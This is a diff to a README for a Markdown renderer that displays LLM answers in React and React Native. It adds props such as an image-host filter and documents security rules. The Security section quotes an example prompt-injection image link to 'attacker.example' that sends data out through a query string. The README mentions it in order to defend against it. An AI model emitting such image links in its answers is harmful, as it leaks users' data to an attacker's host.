@@ -73,7 +73,8 @@ export function Answer({ text, done }: { text: string; done: boolean }) {
 }
 ```
 
-Works with React 18 and 19, in Next.js (App Router: it is a client component), Vite and others.
+Works with React 18 and 19, in Next.js (App Router: it is a client component), Vite and others. Install all the
+peers above even if you turn a feature off: bundlers resolve the on-demand imports at build time.
 
 ### Props
 
@@ -85,6 +86,10 @@ Works with React 18 and 19, in Next.js (App Router: it is a client component), V
 | `softBreaks` | `true` | A single newline becomes a line break, as in chat. `false` for standard Markdown. |
 | `className` | — | Extra class on the wrapper `<div class="rlm-markdown">`. |
 | `components` | — | Element overrides, merged over the built-in safe link and image components. |
+| `isImageAllowed` | all | `(url) => boolean`. A refused image shows its alt text and is never requested (see [Security](#security)). |
+| `tableMaxHeight` | `300` | Tables taller than this scroll inside (px or CSS length; `0` = no limit). |
+| `codeBlockMaxHeight` | `400` | Code blocks taller than this scroll inside (`0` = no limit). |
+| `lineNumbers` | `true` | Line numbers in code blocks. |
 
 ## Use it in React Native
 
@@ -132,6 +137,8 @@ Works in Expo (Go and dev builds) and bare React Native: plain JavaScript, no na
 | `onCopyCode` | — | Shows a Copy button on code blocks. |
 | `highlighter` | Shiki | A custom `(code, lang, scheme) => lines` or `false`. `createCodeHighlighter([...grammars])` adds languages from `@shikijs/langs`. |
 | `scripts` | jsDelivr | `{ mermaid, echarts, katex }`: `{ url, integrity }` of what the WebViews load. |
+| `isImageAllowed` | all | `(url) => boolean`. A refused image shows its alt text and is never requested. |
+| `style` | — | Style of the outer `View`. |
 
 ### Charts
 
@@ -172,12 +179,16 @@ Markdown from a model or a user is treated as untrusted:
 
 - Raw HTML is parsed, then sanitized: no `<script>`, `<iframe>`, `<style>`, event handlers or `<picture>` sources.
   Extra tags allowed: `br`, `sub`, `sup`, `mark`, `details`, `summary`.
+- `id` and `name` from raw HTML get a `user-content-` prefix, so the answer cannot shadow globals or the page's own
+  elements (DOM clobbering).
 - Links and images: `http:`, `https:`, `mailto:` and relative URLs only — `javascript:`, `data:`, `file:` and
   protocol-relative `//host` are dropped. External links open in a new tab with `rel="noopener noreferrer nofollow"`
   and no referrer; images load lazily with no referrer.
 - Mermaid runs with `securityLevel: 'strict'` and no HTML labels; `%%{init}%%` directives and frontmatter config in a
   diagram are removed, and a source over 50,000 characters is refused.
 - KaTeX runs with `trust: false`, `maxExpand: 1000` and `maxSize: 20`.
+- **Images from any http(s) host load by default**, as in other Markdown renderers. A prompt injection can use an image
+  URL to send data out (`![](https://attacker.example/?q=…)`); restrict hosts with `isImageAllowed`.
 - ECharts options: see [Charts](#charts).
 - React Native WebViews: a strict Content-Security-Policy (scripts only from the pinned origin, with SRI), content
   passed as escaped JSON, no navigation away from the document, no file access, no new windows.
@@ -189,7 +200,7 @@ The policy functions are exported for reuse (from any entry, or `react-llm-markd
 ### Tested in a real browser
 
 Every rule is checked end to end in Chromium on the web renderer, the React Native renderer and the WebView documents:
-24 attack payloads (scripts, event handlers, dangerous URLs, chart, diagram and math tricks) must not run anything, load
+27 attack payloads (scripts, event handlers, dangerous URLs, chart, diagram and math tricks) must not run anything, load
 anything from the attacker's host or navigate away, and five performance cases must stay within budget (rendered in
 5 s, typing still responsive within 0.5 s, no slowdown or memory growth on repeat).
 
